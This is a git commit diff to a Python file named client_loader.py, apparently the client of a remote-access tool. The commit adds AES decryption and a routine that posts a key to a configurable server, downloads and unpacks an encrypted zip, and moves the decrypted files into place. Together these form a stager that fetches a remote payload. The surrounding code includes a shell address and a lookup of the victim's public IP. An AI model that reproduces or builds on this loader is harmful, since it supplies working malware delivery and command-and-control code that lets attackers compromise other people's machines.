21f341c7709dd66551432c55fb46ac0c4d6fe32a
Aapng-cmd <82652158+Aapng-cmd@users.noreply.github.com>
2023-08-14 22:10:09 +0300

    ...

--- client_loader.py
+++ client_loader.py
@@ -1,10 +1,35 @@
 import base64
-import os, time
+import os, time, shutil
 import hashlib
+import zipfile
+from io import BytesIO
 import socket, subprocess, requests
 from requests import get
+import random
 from requests.exceptions import ConnectionError
 
+# ------------Encr------------------
+from Crypto.Cipher import AES
+
+class Encryptor:
+    def __init__(self, key):
+        self.__key__ = key
+
+    def __decrypt(self, enc):
+        unpad = lambda s: s[:-ord(s[-1:])]
+
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.__key__, AES.MODE_CFB, iv)
+        return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf-8'))
+
+    def decrypt(self, fn):
+        with open(fn, "rb") as f:
+            data = f.read()
+        with open(fn, "w", encoding="utf-8") as f:
+            f.write(self.__decrypt(data))
+
+# ------------------END---------------
 
 def waiting(s=None, creds=()):
     del s
@@ -48,6 +73,33 @@ def show_geo(public_ip=None):
     except requests.exceptions.ConnectionError:
         print("Connection died")
         return
+def decrypt_folder(name, key):
+    fn = os.listdir(name)[0]
+    names = os.listdir("test\\" + fn)
+    e = Encryptor(key)
+    for name in names:
+        if os.path.isfile("test\\" + fn + "\\" + name):
+            e.decrypt("test\\" + fn + "\\" + name)
+    del e
+    return fn
+
+def get_files(ip, status="update"):
+    key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))
+    k = str(base64.b64encode(key))[2:-1]
+
+    creds = ("user", "pas")
+    url = "https://" + ip
+    data = {
+        "port": "10101",
+        "status": status,
+        "key": k,
+    }
+    q = requests.post(url, auth=creds, data=data)
+    z = zipfile.ZipFile(BytesIO(q.content))
+    z.extractall("./test")
+    _ = decrypt_folder("test", key)
+    shutil.move(f"test/{_}", "./")
+    os.rmdir("test")
 
 
 ip, port = ("", 3333)
@@ -56,7 +108,7 @@ shell_addr = ("", 8081)
 # os.system('chcp 65001')
 subprocess.getoutput('chcp 65001')
 
-key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), 100000)
+key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), random.randint(100000, 999999))
 alias = base64.b64encode(key).decode()[::-1]
 
 client_ip = get("http://api.ipify.org").text
@@ -70,7 +122,7 @@ data = {"port": port,
         }
 
 # headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
-headers = {'Connection':'close'}
+headers = {'Connection': 'close'}
 
 url = 'https://' + ip + '/'
 # c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
@@ -83,6 +135,8 @@ while True:
 
 time.sleep(1)
 print('ok')
+
+get_files(ip, status="get")
 
 #
 # while True:
@@ -101,4 +155,4 @@ print('ok')
 #     except requests.exceptions.ConnectionError:
 #         pass
 
-subprocess.Popen("python client.py")
+# subprocess.Popen("python client.py")
